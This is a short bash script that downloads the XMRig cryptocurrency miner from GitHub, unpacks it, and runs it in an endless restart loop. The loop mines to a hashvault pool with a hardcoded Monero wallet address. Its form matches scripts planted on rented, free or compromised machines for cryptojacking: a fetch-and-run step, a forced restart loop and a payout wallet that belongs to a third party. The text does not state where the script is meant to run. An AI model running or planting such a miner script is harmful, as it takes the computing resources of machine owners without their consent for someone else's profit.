#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-x64.tar.gz && tar xf xmrig-6.15.2-linux-x64.tar.gz
cd xmrig-6.15.2
while [ 1 ]; do
./xmrig --donate-level 1 -o pool.hashvault.pro:80 -u 8BAwTuT1K5FVz73nqizTE8DZjxd5TW9uHF57XsLWK1S4SWNxpuYfpwGeuAc1wUMmUYQNNCsAP4qrMcQZUZkCc3yWNgjq5Ac -p D -a rx/0 -k 
sleep 3
done
sleep 999
exit
